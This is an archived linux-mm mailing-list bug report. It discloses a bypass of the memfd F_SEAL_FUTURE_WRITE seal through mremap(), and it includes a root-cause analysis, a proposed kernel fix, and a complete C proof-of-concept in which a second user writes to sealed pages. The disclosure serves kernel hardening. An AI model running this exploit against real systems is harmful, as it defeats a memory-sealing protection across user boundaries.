Received: from kanga.kvack.org (kanga.kvack.org [205.233.56.17])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id 444E5606A332
	for <linux-mm@archiver.kernel.org>; Sat,  7 Nov 2026 03:07:39 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=gmail.com header.i=@gmail.com header.a=rsa-sha256 header.s=20260707 header.b=Hu4twPnn
Received: by kanga.kvack.org (Postfix)
	id 6648C6B05B0; Fri,  6 Nov 2026 22:07:38 -0500 (EST)
Received: by kanga.kvack.org (Postfix, from userid 40)
	id 615186B05B1; Fri,  6 Nov 2026 22:07:38 -0500 (EST)
X-Delivered-To: int-list-linux-mm@kvack.org
Received: by kanga.kvack.org (Postfix, from userid 63042)
	id 504AD6B05B2; Fri,  6 Nov 2026 22:07:38 -0500 (EST)
X-Delivered-To: linux-mm@kvack.org
Received: from relay.hostedemail.com (smtprelay0010.hostedemail.com [216.40.44.10])
	by kanga.kvack.org (Postfix) with ESMTP id 26A5B6B05B0
	for <linux-mm@kvack.org>; Fri,  6 Nov 2026 22:07:38 -0500 (EST)
Received: from smtpin20.hostedemail.com (lb01a-stub [10.200.18.249])
	by unirelay10.hostedemail.com (Postfix) with ESMTP id 68929C0225
	for <linux-mm@kvack.org>; Sat,  7 Nov 2026 03:07:37 +0000 (UTC)
X-FDA: 85406837754.20.803A790
Received: from mail-dl1-f51.google.com (mail-dl1-f51.google.com [74.125.82.51])
	by imf16.hostedemail.com (Postfix) with ESMTP id A49C0180002
	for <linux-mm@kvack.org>; Sat,  7 Nov 2026 03:07:35 +0000 (UTC)
Authentication-Results: imf16.hostedemail.com;
	dkim=pass header.d=gmail.com header.s=20260707 header.b=Hu4twPnn;
	spf=pass (imf16.hostedemail.com: domain of graypanda.inzag@gmail.com designates 74.125.82.51 as permitted sender) smtp.mailfrom=graypanda.inzag@gmail.com;
	dmarc=pass (policy=none) header.from=gmail.com
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
	s=arc-20220608; t=1794020855;
	h=from:from:sender:reply-to:subject:subject:date:date:
	 message-id:message-id:to:to:cc:cc:mime-version:mime-version:
	 content-type:content-transfer-encoding:content-transfer-encoding:
	 in-reply-to:references:dkim-signature;
	bh=+5OMQOlD3uPwnAi9dWZffdLmbbYMypNRZ6Off9xCCrU=;
	b=Qx9RegP1QAOUoGGaySvJyEtydy5NKHXL46hLWTuxYf+62ZLFGmpor95Mb+U+CKMp9gagLe
	Q1s1CAL1POeUvSVCvdqz6mxWiOWPPKWVHFGqiqF6J67CcLDb27C8FQhWKbiMc3iFbq+7TI
	F56dLIOVXSyIBw1QeXJmh7OBtGBjZtQ=
ARC-Seal: i=1; a=rsa-sha256; d=hostedemail.com; s=arc-20220608; cv=none;
	t=1794020855;
	b=eqsVBi/nN7rfwkZjPeWalx9TGtzKidppeNbOYtGZsFhcygB2NpdC4lK5BITs5ediI/Y7Lo
	8lB5e/iDo9kagpwn1X0heg3x2chTA0FticMrVywq3YMx0B6QIbr9uuSY+7VwU7on01j9/z
	A8A0Npeuz79kFxv6ytTOAGnr/Ps7KD4=
ARC-Authentication-Results: i=1;
	imf16.hostedemail.com;
	dkim=pass header.d=gmail.com header.s=20260707 header.b=Hu4twPnn;
	spf=pass (imf16.hostedemail.com: domain of graypanda.inzag@gmail.com designates 74.125.82.51 as permitted sender) smtp.mailfrom=graypanda.inzag@gmail.com;
	dmarc=pass (policy=none) header.from=gmail.com
Received: by mail-dl1-f51.google.com with SMTP id a92af1059eb24-170135e43c7so2211197c88.0
        for <linux-mm@kvack.org>; Fri, 06 Nov 2026 19:07:35 -0800 (PST)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20260707; t=1794020854; x=1794625654; darn=kvack.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=+5OMQOlD3uPwnAi9dWZffdLmbbYMypNRZ6Off9xCCrU=;
        b=Hu4twPnnPioYy9mvwIme5N8uJEZbkMWFhb9WVRBqhZM33+xG99DiwShY9PN4ORk0Y5
         HhfC83WPV5UKX58ItT2fXJ5rUdRAz6RA5Qc3Q+5cd+xfF7HpZsEfl5neui0xc18L6In+
         M/OJkeilJlloJk+IxeWbHO14+l1VuLQwXUd8uKRfvC2vJtEKPMKNRtP8W+bdE1i9Zsg7
         o7uuc56eVWlhI8gz0wgLhAkBOlIojrupy+dD8nZM/imyO8OEla23UnrOyhLRL/fBwBVR
         ceachPZDlHP9HiHRPgAWZt0iAtAJT93b5gxVZltoZx9uKNHGNDw4mKkDWo7Ph1UrZ9Rt
         mkZA==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1794020854; x=1794625654;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=+5OMQOlD3uPwnAi9dWZffdLmbbYMypNRZ6Off9xCCrU=;
        b=Zn/kFBlorzQQHyGmPvjrx0At2y8RYKtRfkmm89Tsi4N217okKZy/o45pj/MlENsHMK
         1q6xW31mEJPI3n26sXhGwQ/MEZnd+Abyq4EGttw3yG95BoXr8yCyQXxglcc9aVm4kSwS
         crLn3QxsCD1qyj0ZlnfFzDwruTr3oz23EItNNS/L3rqhDfp/OhjfhtapTHcQKI7/sCo5
         iOJ6migBwP2Y5tUFuXxZwzjE7BgrxfB13JffX/ZW/HWhBFzZIVroQ/CfLwUjAVGYWmTX
         JeNWMMzf98yxkOUkKrs8MXs51ZqjeOml1S5mII8ieJpF7mPd5NIMzHXJs2Mz5oAw91wo
         k2nQ==
X-Forwarded-Encrypted: i=1; AKwUvBwVhNBf8F6AfFH7yWgGkwQaHjKHdk6+r3EeTdF+4JhUjwfNR5nAuiUdsksbVSggefEZkn0kcl0fbQ==@kvack.org
X-Gm-Message-State: APuU4Z/KvxYZITn9Q/pToT7l+ojKnJY4RHidS/ZYfOePHXkJNRNvkP1l
	ZF07JbbvvzlfusGcOHLmcB6KdeMOgAgA+d0rKjCblBIAefDO5Ey+GXVh
X-Gm-Gg: AYBFou0HNu01U+7Hc4R10t8noX4+c6j9FYxoHGKCoQC8t01cIbFjIRjkQGLEhlQZVhB
	SrikQMc+CxQduQL7hESee1Uz7u1DY7489xpK+7NetPNbayWK7sXVppMOU9v/jr6jdhhZjm7pgX7
	WXBvkJO+EJs7qCeT10Mv1hjj0DIdxrrBZ0M4BnakU1gcgyOveq2+Ewd/EwKdGTbvQfY63e3MEYx
	UHalFAJKZ6PMINfk8AjvZtfyTcG1I7p4s+tEKVbjMfFt/kfelgq99BbfjUak2fZvBaRtC0CX8SY
	etHeqNar64igO5kOVtlPAh1iauoV5bh4r7ykDOZRfNO6xDnu1fApwnZn3qHoEsMFghOI0sPskvn
	trSxSkuAza1J/ThKH/7HWq1WMPZvuIp5jPSVzw4oqybQTn393L4z9BQIhVc1LHd5vn9lWRxjcE5
	xOPQeaJZLutY3BeoftfTmsmBPoS0tubm3MHRU5mkrL6lzJrl52QoS6h9cC5jjmr0tu5du7imDAf
	GNI70DbfNqBfdeJGOH6c9ftngdzKF7wTZWOcFVeGx13KfCf62Rs4v8meJU4DcpTLeKugPJP4tAE
	Hqr2SzBN9N80lnilTOlQ/EQV8cw9MQ1AnAweSS4VmdgDbKpQ2qQ=
X-Received: by 2002:a05:7022:ef07:b0:194:9e7a:3ba2 with SMTP id a92af1059eb24-1b25d29407bmr6193447c88.2.1794020854124;
        Fri, 06 Nov 2026 19:07:34 -0800 (PST)
Received: from localhost.localdomain ([112.170.44.210])
        by smtp.gmail.com with ESMTPSA id a92af1059eb24-1b25e4df114sm10141554c88.18.2026.11.06.19.07.31
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Fri, 06 Nov 2026 19:07:33 -0800 (PST)
From: Junyoung Jang <graypanda.inzag@gmail.com>
To: Andrew Morton <akpm@linux-foundation.org>,
	"Liam R . Howlett" <liam@infradead.org>,
	Lorenzo Stoakes <ljs@kernel.org>,
	Hugh Dickins <hughd@google.com>,
	David Hildenbrand <david@kernel.org>
Cc: Vlastimil Babka <vbabka@kernel.org>,
	Jann Horn <jannh@google.com>,
	Pedro Falcato <pfalcato@suse.de>,
	Baolin Wang <baolin.wang@linux.alibaba.com>,
	linux-mm@kvack.org,
	linux-kernel@vger.kernel.org,
	Junyoung Jang <graypanda.inzag@gmail.com>
Subject: mm/mremap: F_SEAL_FUTURE_WRITE can be bypassed via mremap() VMA expansion/duplication
Date: Sat,  7 Nov 2026 12:07:08 +0900
Message-ID: <20261107030708.1031977-1-graypanda.inzag@gmail.com>
X-Mailer: git-send-email 2.43.0
X-Archived-By: <archiver.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
X-Spam-Status: No, score=-10.8 required=3.0 tests=BAYES_00,DKIM_SIGNED,
	DKIM_VALID,DKIM_VALID_AU,FREEMAIL_FORGED_FROMDOMAIN,FREEMAIL_FROM,
	HEADER_FROM_DIFFERENT_DOMAINS,INCLUDES_PATCH,MAILING_LIST_MULTI,
	SPF_HELO_PASS,SPF_PASS,USER_AGENT_GIT autolearn=ham autolearn_force=no
	version=4.0.1
X-Rspamd-Server: rspam09
X-Stat-Signature: ujk9hqzn9bwnt987cgbgqqxnih5q5sqq
X-Rspamd-Queue-Id: A49C0180002
X-Rspam-User: 
X-HE-Tag: 1794020855-426351
X-HE-Meta: U2FsdGVkX18mIOWRT8emrNgeJ1KaZmw70DjGHeAyg2S1WP252J/UhPWn5USVWbEfndPDIZ0GdWsx1g4VDyqWxEF4G6RLBFYypsHaXtQ2WXlBd2Drwc4qltwkYLztp76QtnB619XC2+OZX88SB8sQI/QMn3ZXiqpwNc23cIpFLtx8wblKZT6oZs6VQT6wMoqIslFrtNCws6xULoavTvoAIeD8oJchwtirruvcMXBwpl5yRfzAYhKfDCU/+4g1gMkWnMhyv+q9mCgnj3qZoKP1KivhUadX7gEN6AgxT0ZW36q0iT1g5ZjXRVYOq5qst7m/M0g2AggfUXb6D6f1mzQLe1MI+UVQnlXGMihHcr7FfKe52DoM06DdTAWCxUU/bVnTNV9oN10o2nSseaDZb/lu8d33xqdJFmJkVToeM2X4pzOoQgMX2t/3bE8FmOXfFuHAXEAvRt5SrzG01Tj53QK2vS/mH/TOe9Bt49Pjbei4mJLcIYxrTNdJR8LL/iFzII23xVaPuyhZouCttHIF9LU9QEXfcJrs/B7UBUa0gF+jxV/csQW+7NuySP3wj511/4+WHVSxpYOJ6gZRXP8LTF/vR4L+Zctjt/j9ySw/WRYmuO8oOxjAmG2ipOK6vX8QS1G/gy2HRPFZUHZIjOD2nWEJ5A6T47+/B35qrq9Cqd2+YsrckLXhHTTiAmbhTR6/sI2umGLwGbkPH4uUctrTJVpY5I9dVg1q5tP/ptdARPqYYzfuaDTFYxB0cS8ln7C1fUm0XiIeW0W2TJgU2RhH6joImfHb9MSFMTC/j46x3n0O3yVRXrgse7GBhqBlHDkOT+xJjZE1IKgWJtzP2+satSd3hWB42mDoDa72Sm9CFEPnEWXUFGzWlN9sWRxWLXdE7mGHcP8gJCyNqr/2Guf8MQGY2XzlyGu6B8vg+n9jKVo0Sz/Y25PLEXU83wqWRuMbI3QRbyrAMZPpF2SYp37bKh/
 DJ4LNJP/
 m/sdrIhprL3eAvUf+wXn2CCy9run+Bi6UpiCqG2Rex3U/kLG7HriDPRS+znyHvnQFq9ERRsV+osduOnJwFjj7fWCaZcSDafxSL8eu+uQwB0Iz4bdEz5RQ8jp+dDOlcVcq1nttv0DHYZ/Ftb/bCCy67QgiamibchdPPO8PhfW13sbZzrrikXDxLya9yh1Wp/Iado91UnCLq8tCoo+KleyqCDwwQDbfyFQASer29R8wSUVycmaH+tqDvTWP2tvJ4mAyjkUHhflGT2tkQwERW5wIl953vDeH8OSAJ3X9zrLmmu9DLu5uHBmpardyC0l4YR9WM7iQ+VNs4uXWF/TTwlMKSnpzWg3Jo2PliGu0LQqfqE9YnBtC9hGXIZeckjVzB5cFOv0xrfG3vStRWrcK9G5X2e6XsLzf406ZoNTvotYZwOO7374SbcOcd5Jj28jY12uBxcy4atZtAXaq5Jt6vFQrZtPz8N4aWK9Vi8Lmz2B0Iz2wbO+6vLmYjBR0vcKx0cqugBuXZ3uGLJ4YZ4MbcpqxrxuGtg==
Sender: owner-linux-mm@kvack.org
Precedence: bulk
X-Loop: owner-majordomo@kvack.org
List-ID: <linux-mm.kvack.org>
List-Subscribe: <mailto:majordomo@kvack.org>
X-Spam-Checker-Version: SpamAssassin 4.0.1 (2024-03-26) on
	aws-us-west-2-korg-listserv-alma10-1

Hello,

I found a reproducible F_SEAL_FUTURE_WRITE seal-policy bypass. A process
holding a one-page shared writable memfd mapping created before the seal can
use mremap() after the seal to gain writable access to additional file pages.

In the accompanying two-UID reproducer, the second page belongs to a memfd
created by a different unprivileged user. While a new writable mmap() and
pwrite() to that second page both fail with -EPERM, the mremap() path
succeeds and modifies the page's contents.

Affected tree tested:

- Linux 7.4.0-rc1-gd48723711bae, built directly from upstream commit
  d48723711bae9b8cdc56719c448ba42fef28cbee using x86_64_defconfig.
- A second image built from the same commit with the proposed mm/mremap.c
  diff, reported by uname as 7.4.0-rc1-gd48723711bae-dirty.
- Each before/after pair was booted in QEMU with the same statically
  linked C PoC.

Root cause:

The missing seal check is in mm/mremap.c:check_prep_vma() (lines 1808-1872
of the tested commit). mmap() calls memfd_check_seals_mmap() at
mm/mmap.c:499; for F_SEAL_FUTURE_WRITE, mm/memfd.c:384-385 rejects a
new shared writable mapping with EPERM. check_prep_vma() has no equivalent
check before it permits a larger mapping.

For the PoC's old_len=0 call, this condition at mm/mremap.c:1819 only
rejects duplication of a non-shared VMA:

    if (!old_len && !vma_test_any(vma, VMA_SHARED_BIT, VMA_MAYSHARE_BIT)) {

It is false for the PoC's MAP_SHARED VMA. check_prep_vma() then checks
VMA bounds and expansion limits and returns 0 at mm/mremap.c:1872 without
checking vma->vm_file for write seals. For this zero-length call,
expand_vma() moves the VMA and reaches copy_vma_and_data(), which calls
copy_vma() with the larger new_len (mm/mremap.c:1293-1295):

    new_vma = copy_vma(&vma, vrm->new_addr, vrm->new_len, new_pgoff,
                       new_anon_pgoff, &pmc.need_rmap_locks,
                       vrm->flags & MREMAP_DONTUNMAP);

copy_vma() can duplicate the original VMA and extend its range
(mm/vma.c:2052-2055), retaining VM_WRITE and VM_MAYWRITE. The newly
covered second memfd page is writable despite F_SEAL_FUTURE_WRITE.
Ordinary expansion with old_len=one page also succeeded on the unpatched
kernel. A read-only shared mapping with VM_MAYWRITE can likewise be
expanded and then changed to PROT_WRITE with mprotect().

Impact:

This allows a process to write to file pages outside its pre-seal mapping
across a UID boundary, affecting scenarios where a memfd owner grants
limited writable access to a specific range before sealing and relies on
F_SEAL_FUTURE_WRITE to prevent future writable mappings of other pages.

Reproducer summary:

1. Start as root only to set up two distinct unprivileged UIDs (10002 for
   the owner, 10001 for the writer); both drop all capabilities.
2. UID 10002 creates a two-page memfd and initializes page two to 'A'.
3. UID 10002 passes the fd to UID 10001 via SCM_RIGHTS.
4. UID 10001 maps only page one with MAP_SHARED and PROT_WRITE.
5. UID 10002 adds F_SEAL_FUTURE_WRITE.
6. UID 10001 confirms a fresh writable mmap() of page two and pwrite() to it
   both fail with -EPERM.
7. UID 10001 calls mremap(old_addr, 0, 2 * page_size, MREMAP_MAYMOVE),
   writes 'Z' through the expanded mapping, and UID 10002 reads 'Z' back
   from the second file page.

Build and run:
  $ cc -O0 -g -Wall -Wextra -Werror -static memfd_future_write_mremap_poc.c -o poc
  $ sudo ./poc
  writer uid=10001; mmap=EPERM; pwrite=EPERM; mremap write=Z; result=63
  owner uid=10002; file page 2=Z; size=8192; result=255

Suggested fix direction:

I believe mremap() needs to check the memfd write seal before duplicating
(old_len=0) or expanding (new_len > old_len) a shared VMA that has
VM_MAYWRITE.

I tested the rough diff below in check_prep_vma() on the same commit and
confirmed that it blocks the reproducer (mremap fails with -EPERM). However,
I am sending this as a bug report rather than a formal [PATCH] because I am
unsure about potential side effects:

1. Because a PROT_READ shared mapping with VM_MAYWRITE could be expanded and
   later made writable via mprotect(), the diff temporarily sets VMA_WRITE_BIT
   on a local flags copy to force memfd_check_seals_mmap() to return -EPERM.
   However, this rejects legitimate read-only mremap() expansions outright,
   whereas mmap() would normally allow a read-only mapping and simply clear
   VM_MAYWRITE.
2. I am not certain whether check_prep_vma() is the right place regarding
   locking/synchronization against a concurrent F_ADD_SEALS call.

I would appreciate your guidance on the proper way to handle this, or feel
free to take it from here:

diff --git a/mm/mremap.c b/mm/mremap.c
index 70b7264aa..6ed390ed4 100644
--- a/mm/mremap.c
+++ b/mm/mremap.c
@@ -14,6 +14,7 @@
 #include <linux/shm.h>
 #include <linux/ksm.h>
 #include <linux/mman.h>
+#include <linux/memfd.h>
 #include <linux/swap.h>
 #include <linux/capability.h>
 #include <linux/fs.h>
@@ -1807,6 +1808,17 @@ static int check_prep_vma(struct vma_remap_struct *vrm)
 
 	old_len = vrm->old_len;
 	new_len = vrm->new_len;
+	if (new_len > old_len && vma->vm_file &&
+	    vma_test_all(vma, VMA_SHARED_BIT, VMA_MAYWRITE_BIT)) {
+		vma_flags_t flags = vma->flags;
+		int err;
+
+		/* A larger VMA could become writable via mprotect(). */
+		vma_flags_set(&flags, VMA_WRITE_BIT);
+		err = memfd_check_seals_mmap(vma->vm_file, &flags);
+		if (err)
+			return err;
+	}
 
 	/*
 	 * !old_len is a special case where an attempt is made to 'duplicate'

Reproducer code (memfd_future_write_mremap_poc.c):

// SPDX-License-Identifier: GPL-2.0
/*
 * Check whether a mapping created before F_SEAL_FUTURE_WRITE can be
 * duplicated over a second page by a different UID after the seal.
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <grp.h>
#include <linux/capability.h>
#include <linux/memfd.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>

#define OWNER_UID 10002
#define WRITER_UID 10001

static int drop_to(uid_t uid)
{
	struct __user_cap_header_struct hdr = {
		.version = _LINUX_CAPABILITY_VERSION_3, .pid = 0,
	};
	struct __user_cap_data_struct caps[2] = { { 0 }, { 0 } };

	if (setgroups(0, NULL) || setresgid(uid, uid, uid) ||
	    setresuid(uid, uid, uid))
		return -1;
	if (getuid() != uid || geteuid() != uid ||
	    syscall(SYS_capget, &hdr, caps) ||
	    caps[0].effective || caps[1].effective)
		return -1;
	return 0;
}

static int send_fd(int sock, int fd)
{
	char data = 'F';
	char control[CMSG_SPACE(sizeof(fd))] = {};
	struct iovec iov = { .iov_base = &data, .iov_len = 1 };
	struct msghdr msg = {
		.msg_iov = &iov,
		.msg_iovlen = 1,
		.msg_control = control,
		.msg_controllen = sizeof(control),
	};
	struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);

	cmsg->cmsg_level = SOL_SOCKET;
	cmsg->cmsg_type = SCM_RIGHTS;
	cmsg->cmsg_len = CMSG_LEN(sizeof(fd));
	memcpy(CMSG_DATA(cmsg), &fd, sizeof(fd));
	return sendmsg(sock, &msg, 0) == 1 ? 0 : -1;
}

static int recv_fd(int sock)
{
	char data;
	char control[CMSG_SPACE(sizeof(int))] = {};
	struct iovec iov = { .iov_base = &data, .iov_len = 1 };
	struct msghdr msg = {
		.msg_iov = &iov,
		.msg_iovlen = 1,
		.msg_control = control,
		.msg_controllen = sizeof(control),
	};
	struct cmsghdr *cmsg;
	int fd;

	if (recvmsg(sock, &msg, 0) != 1 || data != 'F')
		return -1;
	cmsg = CMSG_FIRSTHDR(&msg);
	if (!cmsg || cmsg->cmsg_level != SOL_SOCKET ||
	    cmsg->cmsg_type != SCM_RIGHTS ||
	    cmsg->cmsg_len != CMSG_LEN(sizeof(fd)))
		return -1;
	memcpy(&fd, CMSG_DATA(cmsg), sizeof(fd));
	return fd;
}

static int writer(int sock, size_t page)
{
	char *old, *expanded;
	char event;
	int fd;
	unsigned int result = 0;

	if (drop_to(WRITER_UID) || getuid() != WRITER_UID)
		return 1;
	result |= 1;
	fd = recv_fd(sock);
	if (fd < 0)
		return 2;
	old = mmap(NULL, page, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
	if (old == MAP_FAILED)
		return 3;
	result |= 2;
	if (write(sock, "R", 1) != 1 || read(sock, &event, 1) != 1 ||
	    event != 'S')
		return 4;
	result |= 4;
	void *fresh = mmap(NULL, page, PROT_READ | PROT_WRITE, MAP_SHARED,
			   fd, page);
	if (fresh != MAP_FAILED) {
		munmap(fresh, page);
		fprintf(stderr, "writer: fresh writable mmap unexpectedly succeeded\n");
		return 5;
	}
	if (errno != EPERM) {
		fprintf(stderr, "writer: fresh writable mmap errno=%d\n", errno);
		return 6;
	}
	result |= 8;
	errno = 0;
	ssize_t written = pwrite(fd, "X", 1, page);
	if (written != -1 || errno != EPERM) {
		fprintf(stderr, "writer: pwrite returned %zd errno=%d\n",
			written, errno);
		return 7;
	}
	result |= 16;
	expanded = mremap(old, 0, 2 * page, MREMAP_MAYMOVE);
	if (expanded == MAP_FAILED) {
		fprintf(stderr, "writer: mremap errno=%d\n", errno);
		return 8;
	}
	expanded[page] = 'Z';
	result |= 32;
	if (write(sock, "Z", 1) != 1)
		return 9;
	printf("writer uid=%u; mmap=EPERM; pwrite=EPERM; mremap write=Z; result=%u\n",
	       getuid(), result);
	fflush(stdout);
	munmap(expanded, 2 * page);
	munmap(old, page);
	close(fd);
	return result == 63 ? 0 : 10;
}

int main(void)
{
	int pair[2], fd, status;
	char event, byte = 0;
	struct stat st;
	pid_t pid;
	size_t page = sysconf(_SC_PAGESIZE);
	unsigned int result = 0;

	alarm(10);
	if (geteuid() != 0)
		return 77;
	if (socketpair(AF_UNIX, SOCK_SEQPACKET, 0, pair))
		return 1;
	pid = fork();
	if (pid < 0)
		return 2;
	if (!pid) {
		close(pair[0]);
		_exit(writer(pair[1], page));
	}
	close(pair[1]);
	if (drop_to(OWNER_UID) || getuid() != OWNER_UID)
		return 3;
	result |= 1;
	fd = memfd_create("seal-cross-uid", MFD_ALLOW_SEALING);
	if (fd < 0 || ftruncate(fd, 2 * page) ||
	    pwrite(fd, "A", 1, page) != 1)
		return 4;
	result |= 2;
	if (send_fd(pair[0], fd) || read(pair[0], &event, 1) != 1 ||
	    event != 'R')
		return 5;
	result |= 4;
	if (fcntl(fd, F_ADD_SEALS, F_SEAL_FUTURE_WRITE))
		return 6;
	result |= 8;
	if (write(pair[0], "S", 1) != 1)
		return 7;
	if (read(pair[0], &event, 1) != 1 || event != 'Z') {
		if (waitpid(pid, &status, 0) == pid && WIFEXITED(status))
			fprintf(stderr, "owner: writer exited %d before Z\n",
				WEXITSTATUS(status));
		return 7;
	}
	result |= 16;
	if (pread(fd, &byte, 1, page) != 1 || byte != 'Z')
		return 8;
	result |= 32;
	if (fstat(fd, &st) || st.st_size != (off_t)(2 * page))
		return 9;
	result |= 64;
	if (waitpid(pid, &status, 0) != pid ||
	    !WIFEXITED(status) || WEXITSTATUS(status))
		return 10;
	result |= 128;
	printf("owner uid=%u; file page 2=%c; size=%lld; result=%u\n",
	       getuid(), byte, (long long)st.st_size, result);
	fflush(stdout);
	return result == 255 ? 0 : 11;
}

Best regards,
Junyoung Jang <graypanda.inzag@gmail.com>

